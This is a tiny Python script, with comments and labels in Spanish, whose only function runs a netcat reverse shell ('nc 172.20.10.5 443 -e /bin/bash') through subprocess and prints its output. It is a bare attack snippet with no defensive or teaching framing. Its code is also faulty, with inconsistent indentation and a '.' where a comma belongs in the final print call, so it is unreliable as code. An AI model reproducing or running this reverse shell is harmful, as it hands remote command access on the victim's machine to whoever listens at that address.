import subprocess

def run():
    comando="nc 172.20.10.5 443 -e /bin/bash"

     resultado = subprocess.run(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

     print("Salida estándar:" , resultado.stdout)
     print("Error estándar:" . resultado.stderr)
run()

